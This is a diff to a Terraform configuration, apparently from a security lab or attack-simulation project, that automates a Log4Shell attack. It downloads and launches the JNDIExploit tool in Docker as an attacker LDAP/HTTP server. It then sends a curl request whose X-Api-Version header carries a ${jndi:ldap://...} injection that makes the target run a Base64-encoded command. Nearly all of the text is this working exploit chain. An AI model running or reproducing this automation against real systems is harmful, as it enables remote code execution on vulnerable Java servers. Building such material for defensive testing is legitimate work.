@@ -12,7 +12,7 @@ locals {
     EOT
     )
     command_payload=<<-EOT
-    bash -c "wget ${local.jdniexploit_url} && unzip JNDIExploit.*.zip && rm *.zip && java -jar /app/JNDIExploit-*.jar -i 0.0.0.0 -p ${local.attacker_http_port}"
+    bash -c "wget ${local.jdniexploit_url} && unzip JNDIExploit.*.zip && rm *.zip && java -jar JNDIExploit-*.jar -i 0.0.0.0 -p ${local.attacker_http_port}"
     EOT
     payload = <<-EOT
     LOGFILE=/tmp/attacker_exec_docker_log4shell_attacker.log
@@ -28,8 +28,9 @@ locals {
     done
     log "docker path: $(which docker)"
     if [[ `sudo docker ps | grep ${local.name}` ]]; then docker stop ${local.name}; fi
-    sudo docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:8088 -p ${local.attacker_ldap_port}:1389 ${local.image} ${local.command_payload}
-    sudo docker ps -a >> $LOGFILE 2>&1
+    log "$(echo 'docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:8088 -p ${local.attacker_ldap_port}:1389 ${local.image} ${local.command_payload}')"
+    docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:8088 -p ${local.attacker_ldap_port}:1389 ${local.image} ${local.command_payload} >> $LOGFILE 2>&1
+    docker ps -a >> $LOGFILE 2>&1
     curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}' >> $LOGFILE 2>&1 
     sleep 30
     log "done"
